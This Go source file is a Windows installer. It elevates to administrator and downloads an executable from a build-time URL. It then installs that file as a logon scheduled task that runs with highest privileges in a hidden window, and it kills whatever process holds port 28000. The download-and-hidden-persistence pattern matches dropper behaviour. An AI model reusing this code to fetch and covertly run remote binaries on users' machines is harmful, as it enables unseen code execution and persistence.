package main

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path"
	"path/filepath"
	"strconv"
	"strings"
	"time"
)

var ossLink string

func main() {
	parts := strings.Split(ossLink, "/")
	if ossLink == "" || len(parts) < 7 {
		showMessage("无效安装包", nil)
		return
	}
	if !isAdmin() {
		runAsAdmin()
		return
	}

	fmt.Println("正在安装...", parts[5])
	username, err := os.UserHomeDir()
	if err != nil {
		showMessage("无法获取用户目录:", err)
		return
	}

	cvExe := "copypaste.exe"
	startUpExe := path.Base(ossLink)
	target := filepath.Join(username, "AppData", "pre-installed")
	exeFile := filepath.Join(target, startUpExe)
	cvFile := filepath.Join(target, cvExe)
	taskName := "CsMonitorStartUp"
	if _, err := os.Stat(target); os.IsNotExist(err) {
		_ = os.MkdirAll(target, os.ModePerm)
	}

	if fileExists(exeFile) {
		killProcess(startUpExe)
		deleteTask(taskName)
		_ = os.Remove(exeFile)
	}

	// 检查端口是否被占用
	_, _ = checkAndKillPort(28000)
	if fileExists(cvFile) {
		killProcess(cvExe)
		deleteTask("RunCV28000")
		os.Remove(cvFile)
	}

	err = downloadFile(exeFile, ossLink)
	if err != nil {
		showMessage("网络异常，请重试", err)
		return
	}

	if err := createTask(taskName, exeFile); err != nil {
		showMessage("安装失败，请重试", err)
		return
	}
	if err := runTask(taskName); err != nil {
		showMessage("安装失败，请重试", err)
		return
	}
	showMessage("安装完成!!!", nil)
}

func isAdmin() bool {
	cmd := exec.Command("net", "session")
	err := cmd.Run()
	return err == nil
}

func runAsAdmin() {
	cmd := exec.Command("powershell", "-Command", "Start-Process", "-FilePath", os.Args[0], "-Verb", "RunAs")
	_ = cmd.Run()
}

func fileExists(filePath string) bool {
	_, err := os.Stat(filePath)
	return !os.IsNotExist(err)
}

func killProcess(processName string) {
	cmd := exec.Command("taskkill", "/IM", processName, "/F")
	_ = cmd.Run()
}

func deleteTask(taskName string) {
	cmd := exec.Command("schtasks", "/delete", "/TN", taskName, "/F")
	_ = cmd.Run()
}

func checkAndKillPort(port int) (bool, error) {
	cmd := exec.Command("cmd", "/C", fmt.Sprintf("netstat -ano | findstr :%d", port))
	output, err := cmd.Output()
	if err != nil {
		return false, err
	}

	if len(output) == 0 {
		return false, nil
	}

	lines := strings.Split(string(output), "\n")
	for _, line := range lines {
		if line != "" {
			parts := strings.Fields(line)
			pid := parts[len(parts)-1]
			pidInt, _ := strconv.Atoi(pid)
			killCmd := exec.Command("cmd", "/C", fmt.Sprintf("taskkill /PID %d /F", pidInt))
			if killErr := killCmd.Run(); killErr != nil {
				return true, killErr
			}
			return true, nil
		}
	}
	return false, nil
}

func downloadFile(filePath, url string) error {
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("下载失败，状态码: %d", resp.StatusCode)
	}

	outFile, err := os.Create(filePath)
	if err != nil {
		return err
	}
	defer outFile.Close()

	totalBytes := resp.ContentLength
	var downloadedBytes int64

	// 创建缓冲区
	buffer := make([]byte, 1024)
	for {
		n, err := resp.Body.Read(buffer)
		if n > 0 {
			// 写入文件
			outFile.Write(buffer[:n])
			downloadedBytes += int64(n)

			// 计算并打印进度
			progress := float64(downloadedBytes) / float64(totalBytes) * 100
			fmt.Printf("\r下载安装文件进度: %.2f%%", progress)
		}
		if err == io.EOF {
			break
		}
		if err != nil {
			return err
		}
	}
	fmt.Println() // 换行
	return nil
}

func createTask(taskName, exeFile string) error {
	cmd := exec.Command("schtasks", "/create", "/TN", taskName, "/TR", fmt.Sprintf("powershell -Command \"Start-Process -FilePath '%s' -WindowStyle Hidden\"", exeFile), "/SC", "onlogon", "/RL", "highest")
	return cmd.Run()
}

func runTask(taskName string) error {
	cmd := exec.Command("schtasks", "/run", "/TN", taskName)
	return cmd.Run()
}

func showMessage(message string, err error) {
	fmt.Println(message, err)
	time.Sleep(time.Second * 3)
}
